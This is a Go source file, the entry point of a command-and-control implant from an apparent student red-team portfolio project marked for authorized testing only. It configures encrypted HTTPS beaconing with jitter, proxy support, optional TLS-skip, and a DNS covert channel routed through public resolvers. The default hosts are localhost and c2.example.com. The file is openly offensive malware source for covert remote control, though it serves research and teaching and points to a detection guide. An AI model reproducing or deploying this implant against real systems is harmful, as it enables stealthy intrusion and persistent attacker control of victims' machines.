package main

import (
	"crypto/rand"
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"os"
	"time"

	"github.com/Raoof128/red-team-c2/implant/comms"
)

// Red Team C2 Implant - Main Entry Point
//
// EDUCATIONAL PURPOSE ONLY
// This code is for authorized security testing, research, and portfolio demonstration.
//
// BLUE TEAM: See blue-team-guide/ directory for detection signatures and mitigations

const (
	version = "1.0.0"
)

type ImplantConfig struct {
	ServerURL       string
	BeaconInterval  int
	Jitter          int
	UseHTTPS        bool
	UseDNS          bool
	DNSDomain       string
	EncryptionKey   string
	ProxyURL        string
	InsecureSkipTLS bool
}

func main() {
	// Parse command-line flags
	config := parseFlags()

	// Print banner
	printBanner()

	// Initialize crypto engine
	var cryptoKey []byte
	if config.EncryptionKey != "" {
		var err error
		cryptoKey, err = hex.DecodeString(config.EncryptionKey)
		if err != nil {
			log.Fatalf("Invalid encryption key: %v", err)
		}
	}

	crypto, err := comms.NewCryptoEngine(cryptoKey)
	if err != nil {
		log.Fatalf("Failed to initialize crypto engine: %v", err)
	}

	// Generate unique beacon ID
	beaconID := generateBeaconID()
	log.Printf("Beacon ID: %s", beaconID)

	// Start appropriate communication channel
	if config.UseHTTPS {
		startHTTPSBeacon(config, beaconID, crypto)
	} else if config.UseDNS {
		startDNSBeacon(config, beaconID, crypto)
	} else {
		log.Println("No communication channel specified. Use -https or -dns")
		os.Exit(1)
	}
}

func parseFlags() *ImplantConfig {
	config := &ImplantConfig{}

	flag.StringVar(&config.ServerURL, "server", "https://127.0.0.1:8443", "C2 server URL")
	flag.IntVar(&config.BeaconInterval, "interval", 60, "Beacon interval in seconds")
	flag.IntVar(&config.Jitter, "jitter", 50, "Jitter percentage")
	flag.BoolVar(&config.UseHTTPS, "https", true, "Use HTTPS beaconing")
	flag.BoolVar(&config.UseDNS, "dns", false, "Use DNS covert channel")
	flag.StringVar(&config.DNSDomain, "dns-domain", "c2.example.com", "DNS domain for covert channel")
	flag.StringVar(&config.EncryptionKey, "key", "", "Hex-encoded encryption key (32 bytes)")
	flag.StringVar(&config.ProxyURL, "proxy", "", "HTTP proxy URL")
	flag.BoolVar(&config.InsecureSkipTLS, "insecure", false, "Skip TLS verification (TESTING ONLY)")

	flag.Parse()

	return config
}

func startHTTPSBeacon(config *ImplantConfig, beaconID string, crypto *comms.CryptoEngine) {
	log.Println("Starting HTTPS beacon...")

	beaconConfig := &comms.BeaconConfig{
		ServerURL:       config.ServerURL,
		BeaconID:        beaconID,
		BaseInterval:    time.Duration(config.BeaconInterval) * time.Second,
		JitterPercent:   config.Jitter,
		MaxRetries:      3,
		Timeout:         30 * time.Second,
		ProxyURL:        config.ProxyURL,
		InsecureSkipTLS: config.InsecureSkipTLS,
	}

	beacon, err := comms.NewHTTPSBeacon(beaconConfig, crypto)
	if err != nil {
		log.Fatalf("Failed to create HTTPS beacon: %v", err)
	}

	log.Printf("Beaconing to: %s", config.ServerURL)
	log.Printf("Interval: %ds (±%d%% jitter)", config.BeaconInterval, config.Jitter)

	if err := beacon.Start(); err != nil {
		log.Fatalf("Beacon error: %v", err)
	}
}

func startDNSBeacon(config *ImplantConfig, beaconID string, crypto *comms.CryptoEngine) {
	log.Println("Starting DNS covert channel...")

	dnsConfig := &comms.DNSBeaconConfig{
		Domain:   config.DNSDomain,
		BeaconID: beaconID,
		Resolvers: []string{
			"8.8.8.8:53",
			"1.1.1.1:53",
		},
		MaxChunkSize: 32,
	}

	dnsChannel, err := comms.NewDNSChannel(dnsConfig, crypto)
	if err != nil {
		log.Fatalf("Failed to create DNS channel: %v", err)
	}

	log.Printf("DNS domain: %s", config.DNSDomain)
	log.Printf("Beacon ID: %s", beaconID)

	// Start DNS beaconing with jitter
	interval := time.Duration(config.BeaconInterval) * time.Second
	dnsChannel.DNSJitterBeacon(interval, config.Jitter)
}

func generateBeaconID() string {
	b := make([]byte, 8)
	rand.Read(b)
	return hex.EncodeToString(b)
}

func printBanner() {
	banner := `
╔═══════════════════════════════════════════════════════╗
║         Red Team C2 Framework - Implant v%s         ║
║                                                       ║
║  ⚠  FOR AUTHORIZED SECURITY TESTING ONLY  ⚠           ║
║                                                       ║
║  Educational & Portfolio Project                     ║
║  Macquarie University - Cybersecurity Master's       ║
║                                                       ║
║  Detection Guide: /blue-team-guide/                  ║
╚═══════════════════════════════════════════════════════╝
`
	fmt.Printf(banner, version)
	fmt.Println()
}
